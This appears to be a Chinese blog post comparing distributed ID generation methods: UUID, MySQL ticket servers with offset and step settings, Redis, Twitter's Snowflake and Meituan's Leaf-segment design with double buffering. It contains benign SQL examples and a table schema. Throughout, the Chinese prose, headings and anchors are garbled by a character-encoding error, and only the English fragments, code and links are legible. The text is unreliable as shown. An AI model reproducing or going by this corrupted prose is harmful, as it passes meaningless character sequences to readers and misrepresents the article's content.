<p>ä¿¡æ¯ä¸å®‰å…¨ï¼šåŸºäºMACåœ°å€ç”ŸæˆUUIDçš„ç®—æ³•å¯èƒ½ä¼šé€ æˆMACåœ°å€æ³„éœ²ï¼Œè¿™ä¸ªæ¼æ´æ›¾è¢«ç”¨äºå¯»æ‰¾æ¢…ä¸½èç—…æ¯’çš„åˆ¶ä½œè€…ä½ç½®ã€‚</p>
<h3 id="æ•°æ®åº“ç”Ÿæˆ"><a href="#æ•°æ®åº“ç”Ÿæˆ" class="headerlink" title="æ•°æ®åº“ç”Ÿæˆ"></a>æ•°æ®åº“ç”Ÿæˆ</h3><p>ä»¥MySQLä¸¾ä¾‹ï¼Œåˆ©ç”¨ç»™å­—æ®µè®¾ç½®<code>auto_increment_increment</code>å’Œ<code>auto_increment_offset</code>æ¥ä¿è¯IDè‡ªå¢ï¼Œæ¯æ¬¡ä¸šåŠ¡ä½¿ç”¨ä¸‹åˆ—SQLè¯»å†™MySQLå¾—åˆ°IDå·ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">begin</span>;</span><br><span class="line">REPLACE <span class="keyword">INTO</span> Tickets64 (stub) <span class="keyword">VALUES</span> (<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> LAST_INSERT_ID();</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262013045.png" alt="image"></p>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>éå¸¸ç®€å•ï¼Œåˆ©ç”¨ç°æœ‰æ•°æ®åº“ç³»ç»Ÿçš„åŠŸèƒ½å®ç°ï¼Œæˆæœ¬å°ï¼Œæœ‰DBAä¸“ä¸šç»´æŠ¤ã€‚</li>
<li>IDå·å•è°ƒè‡ªå¢ï¼Œå¯ä»¥å®ç°ä¸€äº›å¯¹IDæœ‰ç‰¹æ®Šè¦æ±‚çš„ä¸šåŠ¡ã€‚</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>å¼ºä¾èµ–DBï¼Œå½“DBå¼‚å¸¸æ—¶æ•´ä¸ªç³»ç»Ÿä¸å¯ç”¨ï¼Œå±äºè‡´å‘½é—®é¢˜ã€‚é…ç½®ä¸»ä»å¤åˆ¶å¯ä»¥å°½å¯èƒ½çš„å¢åŠ å¯ç”¨æ€§ï¼Œä½†æ˜¯æ•°æ®ä¸€è‡´æ€§åœ¨ç‰¹æ®Šæƒ…å†µä¸‹éš¾ä»¥ä¿è¯ã€‚ä¸»ä»åˆ‡æ¢æ—¶çš„ä¸ä¸€è‡´å¯èƒ½ä¼šå¯¼è‡´é‡å¤å‘å·ã€‚</li>
<li>IDå‘å·æ€§èƒ½ç“¶é¢ˆé™åˆ¶åœ¨å•å°MySQLçš„è¯»å†™æ€§èƒ½ã€‚</li>
</ul>
<p>å¯¹äºMySQLæ€§èƒ½é—®é¢˜ï¼Œå¯ç”¨å¦‚ä¸‹æ–¹æ¡ˆè§£å†³ï¼šåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¯ä»¥å¤šéƒ¨ç½²å‡ å°æœºå™¨ï¼Œæ¯å°æœºå™¨è®¾ç½®ä¸åŒçš„åˆå§‹å€¼ï¼Œä¸”æ­¥é•¿å’Œæœºå™¨æ•°ç›¸ç­‰ã€‚æ¯”å¦‚æœ‰ä¸¤å°æœºå™¨ã€‚è®¾ç½®æ­¥é•¿stepä¸º2ï¼ŒTicketServer1çš„åˆå§‹å€¼ä¸º1ï¼ˆ1ï¼Œ3ï¼Œ5ï¼Œ7ï¼Œ9ï¼Œ11â€¦ï¼‰ã€TicketServer2çš„åˆå§‹å€¼ä¸º2ï¼ˆ2ï¼Œ4ï¼Œ6ï¼Œ8ï¼Œ10â€¦ï¼‰ã€‚è¿™æ˜¯Flickrå›¢é˜Ÿåœ¨2010å¹´æ’°æ–‡ä»‹ç»çš„ä¸€ç§ä¸»é”®ç”Ÿæˆç­–ç•¥ï¼ˆ<a href="http://code.flickr.net/2010/02/08/ticket-servers-distributed-unique-primary-keys-on-the-cheap/">Ticket Servers: Distributed Unique Primary Keys on the Cheap </a>ï¼‰ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œä¸ºäº†å®ç°ä¸Šè¿°æ–¹æ¡ˆåˆ†åˆ«è®¾ç½®ä¸¤å°æœºå™¨å¯¹åº”çš„å‚æ•°ï¼ŒTicketServer1ä»1å¼€å§‹å‘å·ï¼ŒTicketServer2ä»2å¼€å§‹å‘å·ï¼Œä¸¤å°æœºå™¨æ¯æ¬¡å‘å·ä¹‹åéƒ½é€’å¢2ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TicketServer1:</span><br><span class="line">auto<span class="operator">-</span>increment<span class="operator">-</span>increment <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">auto<span class="operator">-</span>increment<span class="operator">-</span><span class="keyword">offset</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">TicketServer2:</span><br><span class="line">auto<span class="operator">-</span>increment<span class="operator">-</span>increment <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">auto<span class="operator">-</span>increment<span class="operator">-</span><span class="keyword">offset</span> <span class="operator">=</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>å‡è®¾æˆ‘ä»¬è¦éƒ¨ç½²Nå°æœºå™¨ï¼Œæ­¥é•¿éœ€è®¾ç½®ä¸ºNï¼Œæ¯å°çš„åˆå§‹å€¼ä¾æ¬¡ä¸º0,1,2â€¦N-1é‚£ä¹ˆæ•´ä¸ªæ¶æ„å°±å˜æˆäº†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262015433.png" alt="image"></p>
<p>è¿™ç§æ¶æ„è²Œä¼¼èƒ½å¤Ÿæ»¡è¶³æ€§èƒ½çš„éœ€æ±‚ï¼Œä½†æœ‰ä»¥ä¸‹å‡ ä¸ªç¼ºç‚¹ï¼š</p>
<ul>
<li>ç³»ç»Ÿæ°´å¹³æ‰©å±•æ¯”è¾ƒå›°éš¾ï¼Œæ¯”å¦‚å®šä¹‰å¥½äº†æ­¥é•¿å’Œæœºå™¨å°æ•°ä¹‹åï¼Œå¦‚æœè¦æ·»åŠ æœºå™¨è¯¥æ€ä¹ˆåšï¼Ÿå‡è®¾ç°åœ¨åªæœ‰ä¸€å°æœºå™¨å‘å·æ˜¯1,2,3,4,5ï¼ˆæ­¥é•¿æ˜¯1ï¼‰ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦æ‰©å®¹æœºå™¨ä¸€å°ã€‚å¯ä»¥è¿™æ ·åšï¼šæŠŠç¬¬äºŒå°æœºå™¨çš„åˆå§‹å€¼è®¾ç½®å¾—æ¯”ç¬¬ä¸€å°è¶…è¿‡å¾ˆå¤šï¼Œæ¯”å¦‚14ï¼ˆå‡è®¾åœ¨æ‰©å®¹æ—¶é—´ä¹‹å†…ç¬¬ä¸€å°ä¸å¯èƒ½å‘åˆ°14ï¼‰ï¼ŒåŒæ—¶è®¾ç½®æ­¥é•¿ä¸º2ï¼Œé‚£ä¹ˆè¿™å°æœºå™¨ä¸‹å‘çš„å·ç éƒ½æ˜¯14ä»¥åçš„å¶æ•°ã€‚ç„¶åæ‘˜æ‰ç¬¬ä¸€å°ï¼ŒæŠŠIDå€¼ä¿ç•™ä¸ºå¥‡æ•°ï¼Œæ¯”å¦‚7ï¼Œç„¶åä¿®æ”¹ç¬¬ä¸€å°çš„æ­¥é•¿ä¸º2ã€‚è®©å®ƒç¬¦åˆæˆ‘ä»¬å®šä¹‰çš„å·æ®µæ ‡å‡†ï¼Œå¯¹äºè¿™ä¸ªä¾‹å­æ¥è¯´å°±æ˜¯è®©ç¬¬ä¸€å°ä»¥ååªèƒ½äº§ç”Ÿå¥‡æ•°ã€‚æ‰©å®¹æ–¹æ¡ˆçœ‹èµ·æ¥å¤æ‚å—ï¼Ÿè²Œä¼¼è¿˜å¥½ï¼Œç°åœ¨æƒ³è±¡ä¸€ä¸‹å¦‚æœæˆ‘ä»¬çº¿ä¸Šæœ‰100å°æœºå™¨ï¼Œè¿™ä¸ªæ—¶å€™è¦æ‰©å®¹è¯¥æ€ä¹ˆåšï¼Ÿç®€ç›´æ˜¯å™©æ¢¦ã€‚æ‰€ä»¥ç³»ç»Ÿæ°´å¹³æ‰©å±•æ–¹æ¡ˆå¤æ‚éš¾ä»¥å®ç°ã€‚</li>
<li>IDæ²¡æœ‰äº†å•è°ƒé€’å¢çš„ç‰¹æ€§ï¼Œåªèƒ½è¶‹åŠ¿é€’å¢ï¼Œè¿™ä¸ªç¼ºç‚¹å¯¹äºä¸€èˆ¬ä¸šåŠ¡éœ€æ±‚ä¸æ˜¯å¾ˆé‡è¦ï¼Œå¯ä»¥å®¹å¿ã€‚</li>
<li>æ•°æ®åº“å‹åŠ›è¿˜æ˜¯å¾ˆå¤§ï¼Œæ¯æ¬¡è·å–IDéƒ½å¾—è¯»å†™ä¸€æ¬¡æ•°æ®åº“ï¼Œåªèƒ½é å †æœºå™¨æ¥æé«˜æ€§èƒ½ã€‚</li>
</ul>
<h3 id="åˆ©ç”¨-redis-ç”Ÿæˆ-id"><a href="#åˆ©ç”¨-redis-ç”Ÿæˆ-id" class="headerlink" title="åˆ©ç”¨ redis ç”Ÿæˆ id"></a>åˆ©ç”¨ redis ç”Ÿæˆ id</h3><p>æ€§èƒ½æ¯”è¾ƒå¥½ï¼Œçµæ´»æ–¹ä¾¿ï¼Œä¸ä¾èµ–äºæ•°æ®åº“ã€‚ä½†æ˜¯ï¼Œå¼•å…¥äº†æ–°çš„ç»„ä»¶é€ æˆç³»ç»Ÿæ›´åŠ å¤æ‚ï¼Œå¯ç”¨æ€§é™ä½ï¼Œç¼–ç æ›´åŠ å¤æ‚ï¼Œå¢åŠ äº†ç³»ç»Ÿæˆæœ¬ã€‚</p>
<h3 id="Twitterçš„snowflakeç®—æ³•"><a href="#Twitterçš„snowflakeç®—æ³•" class="headerlink" title="Twitterçš„snowflakeç®—æ³•"></a>Twitterçš„snowflakeç®—æ³•</h3><p>Github åœ°å€ï¼š<a href="https://github.com/twitter-archive/snowflake%E3%80%82">https://github.com/twitter-archive/snowflakeã€‚</a></p>
<p>æ ¸å¿ƒæ€æƒ³ï¼š</p>
<p>ä½¿ç”¨41bitä½œä¸ºæ¯«ç§’æ•°ï¼Œ10bitä½œä¸ºæœºå™¨çš„IDï¼ˆ5ä¸ªbitæ˜¯æ•°æ®ä¸­å¿ƒï¼Œ5ä¸ªbitçš„æœºå™¨IDï¼‰ï¼Œ12bitä½œä¸ºæ¯«ç§’å†…çš„æµæ°´å·ï¼ˆæ„å‘³ç€æ¯ä¸ªèŠ‚ç‚¹åœ¨æ¯æ¯«ç§’å¯ä»¥äº§ç”Ÿ 4096 ä¸ª IDï¼‰ï¼Œæœ€åè¿˜æœ‰ä¸€ä¸ªç¬¦å·ä½ï¼Œæ°¸è¿œæ˜¯0ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262008389.png" alt="img"></p>
<p><strong>ä¼˜ç‚¹ï¼š</strong> </p>
<ul>
<li>ç”ŸæˆIDä¸ä¾èµ–äºDBï¼Œå®Œå…¨åœ¨å†…å­˜ç”Ÿæˆï¼Œé«˜æ€§èƒ½é«˜å¯ç”¨ã€‚ </li>
<li>IDå‘ˆè¶‹åŠ¿é€’å¢ï¼Œåç»­æ’å…¥ç´¢å¼•æ ‘çš„æ—¶å€™æ€§èƒ½è¾ƒå¥½ã€‚</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><p>ä¾èµ–äºç³»ç»Ÿæ—¶é’Ÿçš„ä¸€è‡´æ€§ã€‚å¦‚æœæŸå°æœºå™¨çš„ç³»ç»Ÿæ—¶é’Ÿå›æ‹¨ï¼Œæœ‰å¯èƒ½é€ æˆIDå†²çªï¼Œæˆ–è€…IDä¹±åºã€‚</p>
</li>
<li><p>idé€’å¢è¿˜å¯èƒ½ä¼šæœ‰ä¿¡æ¯å®‰å…¨é—®é¢˜ï¼Œç«äº‰å¯¹æ‰‹å¯èƒ½ä¼šé€šè¿‡è¿™ä¸ªidçŸ¥é“å…¬å¸ä¸€å¤©çš„å•é‡ã€‚</p>
</li>
</ul>
<h3 id="ç¾å›¢çš„Leafåˆ†å¸ƒå¼IDç”Ÿæˆç³»ç»Ÿ"><a href="#ç¾å›¢çš„Leafåˆ†å¸ƒå¼IDç”Ÿæˆç³»ç»Ÿ" class="headerlink" title="ç¾å›¢çš„Leafåˆ†å¸ƒå¼IDç”Ÿæˆç³»ç»Ÿ"></a>ç¾å›¢çš„Leafåˆ†å¸ƒå¼IDç”Ÿæˆç³»ç»Ÿ</h3><blockquote>
<p>There are no two identical leaves in the world !</p>
</blockquote>
<p>Leaf æ˜¯ç¾å›¢å¼€æºçš„åˆ†å¸ƒå¼IDç”Ÿæˆå™¨ï¼Œèƒ½ä¿è¯å…¨å±€å”¯ä¸€æ€§ã€è¶‹åŠ¿é€’å¢ã€å•è°ƒé€’å¢ã€ä¿¡æ¯å®‰å…¨ï¼Œä½†ä¹Ÿéœ€è¦ä¾èµ–å…³ç³»æ•°æ®åº“ã€Zookeeperç­‰ä¸­é—´ä»¶ã€‚</p>
<p>ç¾å›¢æŠ€æœ¯å›¢é˜Ÿçš„ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://tech.meituan.com/2017/04/21/mt-leaf.html">https://tech.meituan.com/2017/04/21/mt-leaf.html</a> ã€‚</p>
<h4 id="Leaf-segmentæ•°æ®åº“æ–¹æ¡ˆ"><a href="#Leaf-segmentæ•°æ®åº“æ–¹æ¡ˆ" class="headerlink" title="Leaf-segmentæ•°æ®åº“æ–¹æ¡ˆ"></a>Leaf-segmentæ•°æ®åº“æ–¹æ¡ˆ</h4><p>Leaf-segmentæ–¹æ¡ˆï¼Œåœ¨ä½¿ç”¨æ•°æ®åº“ç”Ÿæˆçš„æ–¹æ¡ˆä¸Šï¼Œåšäº†å¦‚ä¸‹æ”¹å˜ï¼šåŸæ–¹æ¡ˆæ¯æ¬¡è·å–IDéƒ½å¾—è¯»å†™ä¸€æ¬¡æ•°æ®åº“ï¼Œé€ æˆæ•°æ®åº“å‹åŠ›å¤§ã€‚æ”¹ä¸ºåˆ©ç”¨proxy serveræ‰¹é‡è·å–ï¼Œæ¯æ¬¡è·å–ä¸€ä¸ªsegmentï¼ˆstepå†³å®šå¤§å°ï¼‰å·æ®µçš„å€¼ã€‚ç”¨å®Œä¹‹åå†å»æ•°æ®åº“è·å–æ–°çš„å·æ®µï¼Œå¯ä»¥å¤§å¤§çš„å‡è½»æ•°æ®åº“çš„å‹åŠ›ã€‚ å„ä¸ªä¸šåŠ¡ä¸åŒçš„å‘å·éœ€æ±‚ç”¨biz_tagå­—æ®µæ¥åŒºåˆ†ï¼Œæ¯ä¸ªbiz-tagçš„IDè·å–ç›¸äº’éš”ç¦»ï¼Œäº’ä¸å½±å“ã€‚å¦‚æœä»¥åæœ‰æ€§èƒ½éœ€æ±‚éœ€è¦å¯¹æ•°æ®åº“æ‰©å®¹ï¼Œä¸éœ€è¦ä¸Šè¿°æè¿°çš„å¤æ‚çš„æ‰©å®¹æ“ä½œï¼Œåªéœ€è¦å¯¹biz_tagåˆ†åº“åˆ†è¡¨å°±è¡Œã€‚</p>
<p>æ•°æ®åº“è¡¨è®¾è®¡å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-------------+--------------+------+-----+-------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Field       <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span>           <span class="operator">|</span> Extra                       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------------+------+-----+-------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> biz_tag     <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">128</span>) <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> PRI <span class="operator">|</span>                   <span class="operator">|</span>                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> max_id      <span class="operator">|</span> <span class="type">bigint</span>(<span class="number">20</span>)   <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="number">1</span>                 <span class="operator">|</span>                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> step        <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>              <span class="operator">|</span>                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">desc</span>        <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">256</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>              <span class="operator">|</span>                             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> update_time <span class="operator">|</span> <span class="type">timestamp</span>    <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span>     <span class="operator">|</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="operator">|</span> <span class="keyword">on</span> <span class="keyword">update</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+--------------+------+-----+-------------------+-----------------------------+</span></span><br></pre></td></tr></table></figure>

<p>é‡è¦å­—æ®µè¯´æ˜ï¼šbiz_tagç”¨æ¥åŒºåˆ†ä¸šåŠ¡ï¼Œmax_idè¡¨ç¤ºè¯¥biz_tagç›®å‰æ‰€è¢«åˆ†é…çš„IDå·æ®µçš„æœ€å¤§å€¼ï¼Œstepè¡¨ç¤ºæ¯æ¬¡åˆ†é…çš„å·æ®µé•¿åº¦ã€‚åŸæ¥è·å–IDæ¯æ¬¡éƒ½éœ€è¦å†™æ•°æ®åº“ï¼Œç°åœ¨åªéœ€è¦æŠŠstepè®¾ç½®å¾—è¶³å¤Ÿå¤§ï¼Œæ¯”å¦‚1000ã€‚é‚£ä¹ˆåªæœ‰å½“1000ä¸ªå·è¢«æ¶ˆè€—å®Œäº†ä¹‹åæ‰ä¼šå»é‡æ–°è¯»å†™ä¸€æ¬¡æ•°æ®åº“ã€‚è¯»å†™æ•°æ®åº“çš„é¢‘ç‡ä»1å‡å°åˆ°äº†1&#x2F;stepï¼Œå¤§è‡´æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262038462.png" alt="image"></p>
<p>test_tagåœ¨ç¬¬ä¸€å°Leafæœºå™¨ä¸Šæ˜¯1~1000çš„å·æ®µï¼Œå½“è¿™ä¸ªå·æ®µç”¨å®Œæ—¶ï¼Œä¼šå»åŠ è½½å¦ä¸€ä¸ªé•¿åº¦ä¸ºstep&#x3D;1000çš„å·æ®µï¼Œå‡è®¾å¦å¤–ä¸¤å°å·æ®µéƒ½æ²¡æœ‰æ›´æ–°ï¼Œè¿™ä¸ªæ—¶å€™ç¬¬ä¸€å°æœºå™¨æ–°åŠ è½½çš„å·æ®µå°±åº”è¯¥æ˜¯3001~4000ã€‚åŒæ—¶æ•°æ®åº“å¯¹åº”çš„biz_tagè¿™æ¡æ•°æ®çš„max_idä¼šä»3000è¢«æ›´æ–°æˆ4000ï¼Œæ›´æ–°å·æ®µçš„SQLè¯­å¥å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Begin</span></span><br><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">table</span> <span class="keyword">SET</span> max_id<span class="operator">=</span>max_id<span class="operator">+</span>step <span class="keyword">WHERE</span> biz_tag<span class="operator">=</span>xxx</span><br><span class="line"><span class="keyword">SELECT</span> tag, max_id, step <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> biz_tag<span class="operator">=</span>xxx</span><br><span class="line"><span class="keyword">Commit</span></span><br></pre></td></tr></table></figure>

<p>è¿™ç§æ¨¡å¼æœ‰ä»¥ä¸‹ä¼˜ç¼ºç‚¹ï¼š</p>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>LeafæœåŠ¡å¯ä»¥å¾ˆæ–¹ä¾¿çš„çº¿æ€§æ‰©å±•ï¼Œæ€§èƒ½å®Œå…¨èƒ½å¤Ÿæ”¯æ’‘å¤§å¤šæ•°ä¸šåŠ¡åœºæ™¯ã€‚</li>
<li>IDå·ç æ˜¯è¶‹åŠ¿é€’å¢çš„8byteçš„64ä½æ•°å­—ï¼Œæ»¡è¶³ä¸Šè¿°æ•°æ®åº“å­˜å‚¨çš„ä¸»é”®è¦æ±‚ã€‚</li>
<li>å®¹ç¾æ€§é«˜ï¼ŒLeafæœåŠ¡å†…éƒ¨æœ‰å·æ®µç¼“å­˜ï¼Œå³ä½¿DBå®•æœºï¼ŒçŸ­æ—¶é—´å†…Leafä»èƒ½æ­£å¸¸å¯¹å¤–æä¾›æœåŠ¡ã€‚</li>
<li>å¯ä»¥è‡ªå®šä¹‰max_idçš„å¤§å°ï¼Œéå¸¸æ–¹ä¾¿ä¸šåŠ¡ä»åŸæœ‰çš„IDæ–¹å¼ä¸Šè¿ç§»è¿‡æ¥ã€‚</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>IDå·ç ä¸å¤Ÿéšæœºï¼Œèƒ½å¤Ÿæ³„éœ²å‘å·æ•°é‡çš„ä¿¡æ¯ï¼Œä¸å¤ªå®‰å…¨ã€‚</li>
<li>TP999æ•°æ®æ³¢åŠ¨å¤§ï¼Œå½“å·æ®µä½¿ç”¨å®Œä¹‹åè¿˜æ˜¯ä¼šhangåœ¨æ›´æ–°æ•°æ®åº“çš„I&#x2F;Oä¸Šï¼Œtg999æ•°æ®ä¼šå‡ºç°å¶å°”çš„å°–åˆºã€‚</li>
<li>DBå®•æœºä¼šé€ æˆæ•´ä¸ªç³»ç»Ÿä¸å¯ç”¨ã€‚</li>
</ul>
<h5 id="åŒbufferä¼˜åŒ–"><a href="#åŒbufferä¼˜åŒ–" class="headerlink" title="åŒbufferä¼˜åŒ–"></a>åŒbufferä¼˜åŒ–</h5><p>å¯¹äºç¬¬äºŒä¸ªç¼ºç‚¹ï¼ŒLeaf-segmentåšäº†ä¸€äº›ä¼˜åŒ–ï¼š</p>
<p>Leaf å–å·æ®µçš„æ—¶æœºæ˜¯åœ¨å·æ®µæ¶ˆè€—å®Œçš„æ—¶å€™è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ„å‘³ç€å·æ®µä¸´ç•Œç‚¹çš„IDä¸‹å‘æ—¶é—´å–å†³äºä¸‹ä¸€æ¬¡ä»DBå–å›å·æ®µçš„æ—¶é—´ï¼Œå¹¶ä¸”åœ¨è¿™æœŸé—´è¿›æ¥çš„è¯·æ±‚ä¹Ÿä¼šå› ä¸ºDBå·æ®µæ²¡æœ‰å–å›æ¥ï¼Œå¯¼è‡´çº¿ç¨‹é˜»å¡ã€‚å¦‚æœè¯·æ±‚DBçš„ç½‘ç»œå’ŒDBçš„æ€§èƒ½ç¨³å®šï¼Œè¿™ç§æƒ…å†µå¯¹ç³»ç»Ÿçš„å½±å“æ˜¯ä¸å¤§çš„ï¼Œä½†æ˜¯å‡å¦‚å–DBçš„æ—¶å€™ç½‘ç»œå‘ç”ŸæŠ–åŠ¨ï¼Œæˆ–è€…DBå‘ç”Ÿæ…¢æŸ¥è¯¢å°±ä¼šå¯¼è‡´æ•´ä¸ªç³»ç»Ÿçš„å“åº”æ—¶é—´å˜æ…¢ã€‚</p>
<p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¸Œæœ›DBå–å·æ®µçš„è¿‡ç¨‹èƒ½å¤Ÿåšåˆ°æ— é˜»å¡ï¼Œä¸éœ€è¦åœ¨DBå–å·æ®µçš„æ—¶å€™é˜»å¡è¯·æ±‚çº¿ç¨‹ï¼Œå³å½“å·æ®µæ¶ˆè´¹åˆ°æŸä¸ªç‚¹æ—¶å°±å¼‚æ­¥çš„æŠŠä¸‹ä¸€ä¸ªå·æ®µåŠ è½½åˆ°å†…å­˜ä¸­ã€‚è€Œä¸éœ€è¦ç­‰åˆ°å·æ®µç”¨å°½çš„æ—¶å€™æ‰å»æ›´æ–°å·æ®µã€‚è¿™æ ·åšå°±å¯ä»¥å¾ˆå¤§ç¨‹åº¦ä¸Šçš„é™ä½ç³»ç»Ÿçš„TP999æŒ‡æ ‡ã€‚è¯¦ç»†å®ç°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262038791.png" alt="image"></p>
<p>é‡‡ç”¨åŒbufferçš„æ–¹å¼ï¼ŒLeafæœåŠ¡å†…éƒ¨æœ‰ä¸¤ä¸ªå·æ®µç¼“å­˜åŒºsegmentã€‚å½“å‰å·æ®µå·²ä¸‹å‘10%æ—¶ï¼Œå¦‚æœä¸‹ä¸€ä¸ªå·æ®µæœªæ›´æ–°ï¼Œåˆ™å¦å¯ä¸€ä¸ªæ›´æ–°çº¿ç¨‹å»æ›´æ–°ä¸‹ä¸€ä¸ªå·æ®µã€‚å½“å‰å·æ®µå…¨éƒ¨ä¸‹å‘å®Œåï¼Œå¦‚æœä¸‹ä¸ªå·æ®µå‡†å¤‡å¥½äº†åˆ™åˆ‡æ¢åˆ°ä¸‹ä¸ªå·æ®µä¸ºå½“å‰segmentæ¥ç€ä¸‹å‘ï¼Œå¾ªç¯å¾€å¤ã€‚</p>
<ul>
<li>æ¯ä¸ªbiz-tagéƒ½æœ‰æ¶ˆè´¹é€Ÿåº¦ç›‘æ§ï¼Œé€šå¸¸æ¨èsegmenté•¿åº¦è®¾ç½®ä¸ºæœåŠ¡é«˜å³°æœŸå‘å·QPSçš„600å€ï¼ˆ10åˆ†é’Ÿï¼‰ï¼Œè¿™æ ·å³ä½¿DBå®•æœºï¼ŒLeafä»èƒ½æŒç»­å‘å·10-20åˆ†é’Ÿä¸å—å½±å“ã€‚</li>
<li>æ¯æ¬¡è¯·æ±‚æ¥ä¸´æ—¶éƒ½ä¼šåˆ¤æ–­ä¸‹ä¸ªå·æ®µçš„çŠ¶æ€ï¼Œä»è€Œæ›´æ–°æ­¤å·æ®µï¼Œæ‰€ä»¥å¶å°”çš„ç½‘ç»œæŠ–åŠ¨ä¸ä¼šå½±å“ä¸‹ä¸ªå·æ®µçš„æ›´æ–°ã€‚</li>
</ul>
<h5 id="Leafé«˜å¯ç”¨å®¹ç¾"><a href="#Leafé«˜å¯ç”¨å®¹ç¾" class="headerlink" title="Leafé«˜å¯ç”¨å®¹ç¾"></a>Leafé«˜å¯ç”¨å®¹ç¾</h5><p>å¯¹äºç¬¬ä¸‰ç‚¹â€œDBå¯ç”¨æ€§â€é—®é¢˜ï¼Œç›®å‰é‡‡ç”¨ä¸€ä¸»ä¸¤ä»çš„æ–¹å¼ï¼ŒåŒæ—¶åˆ†æœºæˆ¿éƒ¨ç½²ï¼ŒMasterå’ŒSlaveä¹‹é—´é‡‡ç”¨<strong>åŠåŒæ­¥æ–¹å¼åŒæ­¥æ•°æ®</strong>ã€‚åŒæ—¶ä½¿ç”¨å…¬å¸Atlasæ•°æ®åº“ä¸­é—´ä»¶(å·²å¼€æºï¼Œæ”¹åä¸º<a href="http://tech.meituan.com/dbproxy-introduction.html">DBProxy</a>)åšä¸»ä»åˆ‡æ¢ã€‚å½“ç„¶è¿™ç§æ–¹æ¡ˆåœ¨ä¸€äº›æƒ…å†µä¼šé€€åŒ–æˆå¼‚æ­¥æ¨¡å¼ï¼Œç”šè‡³åœ¨<strong>éå¸¸æç«¯</strong>æƒ…å†µä¸‹ä»ç„¶ä¼šé€ æˆæ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä½†æ˜¯å‡ºç°çš„æ¦‚ç‡éå¸¸å°ã€‚å¦‚æœä½ çš„ç³»ç»Ÿè¦ä¿è¯100%çš„æ•°æ®å¼ºä¸€è‡´ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨â€œç±»Paxosç®—æ³•â€å®ç°çš„å¼ºä¸€è‡´MySQLæ–¹æ¡ˆï¼Œå¦‚MySQL 5.7å‰æ®µæ—¶é—´åˆšåˆšGAçš„<a href="https://dev.mysql.com/doc/refman/5.7/en/group-replication.html">MySQL Group Replication</a>ã€‚ä½†æ˜¯è¿ç»´æˆæœ¬å’Œç²¾åŠ›éƒ½ä¼šç›¸åº”çš„å¢åŠ ï¼Œæ ¹æ®å®é™…æƒ…å†µé€‰å‹å³å¯ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262038815.png" alt="image"></p>
